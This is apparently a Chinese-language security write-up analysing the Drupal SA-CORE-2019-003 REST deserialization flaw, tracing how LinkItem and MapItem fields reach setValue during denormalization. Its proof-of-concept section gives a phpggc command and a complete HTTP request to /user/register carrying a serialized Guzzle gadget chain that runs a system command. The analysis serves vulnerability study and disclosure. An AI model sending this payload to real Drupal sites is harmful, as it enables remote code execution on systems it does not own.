type_ShortCut
在 ShortCut 的情况下只有 `EntityReferenceFieldItemList`，`FieldItemList` 这两种情况。
那么非 ShortCut 的情况呢。
在展开的时候尝试使用
但发现了 ContentEntityNormalizer->denormalizeFieldData 会直接抛出异常
原因是因为
这个 use 限定了 `denormalizeFieldData` 可以被传入的实例类型
必须为 `FieldableEntityInterface` 的实现
因为没有直接 implements 的，转而寻找子类
实际有这一处
    interface ContentEntityInterface extends Traversable, FieldableEntityInterface, TranslatableRevisionableInterface
interface 类型的有
  * ShortcutInterface
  * MessageInterface
  * ContentModerationStateInterface
  * FileInterface
  * CommentInterface
  * ItemInterface
  * FeedInterface
  * UserInterface
  * BlockContentInterface
  * WorkspaceInterface
  * MenuLinkContentInterface
  * TermInterface
  * NodeInterface
  * MediaInterface
回到刚才的要求里，并结合cache data 列表
我验证的可用的有且仅有
  * shortcut/default (成立)
  * user/user (无 entity->get)
  * comment/comment
  * file/file
shortcut/default 解析
了解完这些之后
那么此时就要开始根据最开始的 diff 结果开始进行情况过滤了。
因为 `denormalizeFieldData` 这个在 `DrupalserializationNormalizer`
中实现的方法应该是属于定义的接口函数，会根据不同是实例调用到对应实例的 `Normalizer` 的子 `denormalize`
处理函数。此处由函数名以及代码逻辑得知此处由 `field` 来决定
那么此处需要的 entity 是什么呢？ 从 diff 中看到受影响的是 `MapItem` `LinkItem` 这两个类，所以就得往上追溯是哪一个
entity 会调用到对应 Field。
###  Diff 入手
从 diff 中看到受影响的是 `MapItem` `LinkItem` 这两个类，所以就得往上追溯是哪一个 entity 会调用到对应 Field。
那就拿 `LinkItem` 开刀
interface_logic
由于触发在 `setValue` 那么肯定是要去找对应的调用，而根据上文以及阅读的代码，drupal 封装自 symfony
而所有的方式基本都已用接口的方式实现，那么在这种设计模式下你是不可能直观的找到 `LinkItem->setValue` 这种简单的调用的。
phpstorm 的 FindUsage 果然无法精确定位这种设计模式 ：（
那么此处就涉及到 drupal 的虚函数了，那么设计模式的东西真令人头大。
LinkItem 实现了 `LinkItemInterface` 这个接口
LinkItemInterface 继承于 FieldItemInterface
可以在源码中找到针对 `FieldItemInterface` 实现序列化/反序列化的 `FieldItemNormalizer`
emm 其实这里的理由并不够太充分，但实际阅读源码，drupal 中还有大量的类似实现，那么就可以确定这就是 drupal 的设计模式:
基础类实现具体接口，而对应的父接口则有固定的反序列化/序列化的实现
观测其反序列化实现中存在 setValue 的调用
那么只需要再去找 `FieldItemNormalizer` 的 denormalize 调用即可
而在刚才阅读 `denormalizeFieldData` 的代码的时候就不难明白， drupal 中所有的序列化调用都是 symfony 的
`DenormalizerInterface` 的实现
前期情况回顾一下
Symfony `Serializer->denormalize()` 根据 post /user  
最终导向了 `ContentEntityNormalizer->denormalizeFieldData()`
此处的 entity 就是刚才分析的 getStorage=>create 这个过程创建的 entity 实体，下面即有所需的 `denormalize`
调用。要调用到 `FieldItemNormalizer` 就需要满足
1）
`entity->get($field_name)` 需要返回一个使用 `DrupalCoreFieldFieldItemInterface` 的实例
2）
此处 `getDenormalizer` 的检验上文已经说过 点我回顾
实际也还是在这 18 个结果中找到对应的条件
要获得 `FieldItemNormalizer` 就必须满足传入的数据是 `DrupalCoreFieldFieldItemInterface`
这个接口的实现或者是子类接口的实现
这就是一个直接可以搜索到的子类接口
而这就是是其对应的实现
从而问题就变成了 `$entity->get($field_name);` 如何才能返回
`FieldItemInterface` 那么问题就来了，根据
shortcut/default 解析
entity->get 解析
这里的分析，没有满足 FieldItemInterface 这个条件的情况。
有的是如下两种情况
`EntityReferenceFieldItemList`，`FieldItemList`
但是这里可以联想以及搜索一下 `FieldItemList` ，毕竟和所需的元素只有状态的差别 List->Item 这里从 pythoner
的角度不难觉得是可以联想的
那么就以 `FieldItemList` 向下推导
FieldNormalizer->denormalize 果然和想象的一致，是可以从 List 中提取出单个元素再次进行 denormalize 处理
核心就在于 `$item_class = $items->getItemDefinition()->getClass();` 能获得
FieldItemInterface 的实现吗？
对应的 `$definitions` 是 `DiscoveryCachedTrait` 中保存的 `$definitions`
而在这之中恰好存在
  * field_item:link 
    * DrupallinkPluginFieldFieldTypeLinkItem
  * filed_item:map 
    * DrupalCoreFieldPluginFieldFieldTypeMapItem
那么至此漏洞以及 drupal 的流程也已叙述完毕
## 0x02 漏洞证明
如果使用/user/register接口的话，可以跳过正常的字段检测，那么需要一些必要字段来通过check，此次没有阅读源码直接猜想得出常见的用户注册字段。但是又会产生新的错误，不如不操作
: (
之后确认源码，针对输入信息的校验其实是发生在所有的denormalize之后的所以即使不传入相关信息也可以正常触发反序列化
利用 [phpggc](https://github.com/ambionics/phpggc)
    phpggc guzzle/rce1 system id --json
如果使用`/user/register` 接口的话那么需要一些必要字段来通过`check`此次因为是REST接口所以可以，不阅读源码直接猜想得出
    POST /drupal/user/register?_format=hal_json HTTP/1.1
    Host: 127.0.0.1
    Content-Type: application/hal+json
    cache-control: no-cache
    Postman-Token: 258f5d68-a142-4837-b76c-b15807e84bdb
    {
    "link": [{"options":"O:24:"GuzzleHttp\Psr7\FnStream":2:{s:33:"u0000GuzzleHttp\Psr7\FnStreamu0000methods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\HandlerStack":3:{s:32:"u0000GuzzleHttp\HandlerStacku0000handler";s:2:"id";s:30:"u0000GuzzleHttp\HandlerStacku0000stack";a:1:{i:0;a:1:{i:0;s:6:"system";}}s:31:"u0000GuzzleHttp\HandlerStacku0000cached";b:0;}i:1;s:7:"resolve";}}s:9:"_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}"}],
    "title": ["bbb"],
    "username": "213",
    "password": "EqLp7rhVvsh3fhPPsJBP",
    "email": "PI:EMAIL",
    "_links": {
    "type": {"href": "http://127.0.0.1/drupal/rest/type/shortcut/default"}
    }
    }------WebKitFormBoundary7MA4YWxkTrZu0gW--    
## 0x03 参考链接
[Drupal core – Highly critical – Remote Code Execution – SA-CORE-2019-003 |
Drupal.org](https://www.drupal.org/sa-core-2019-003)
[Drupal SA-CORE-2019-003 远程命令执行分析-腾讯御见威胁情报中心](https://mp.weixin.qq.com/s/hvHkN1YdnvkgJBc2F1oqlQ)
[Exploiting Drupal8’s REST RCE](https://www.ambionics.io/blog/drupal8-rce)